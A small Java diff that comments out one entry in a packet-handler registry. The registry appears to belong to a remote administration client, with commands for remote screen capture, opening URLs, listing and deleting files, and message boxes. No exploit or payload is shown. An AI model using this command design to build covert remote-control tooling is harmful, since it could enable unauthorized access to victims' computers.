@@ -17,7 +17,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put((byte) 10, Packet10Messagebox.class);
 		incomingPackets.put((byte) 11, Packet11Disconnect.class);
 		incomingPackets.put((byte) 12, Packet12RemoteScreen.class);
-		incomingPackets.put((byte) 13, Packet13OneRemoteScreen.class);
+		// 13
 		incomingPackets.put((byte) 14, Packet14VisitURL.class);
 		incomingPackets.put((byte) 15, Packet15ListFiles.class);
 		incomingPackets.put((byte) 16, Packet16DeleteFile.class);
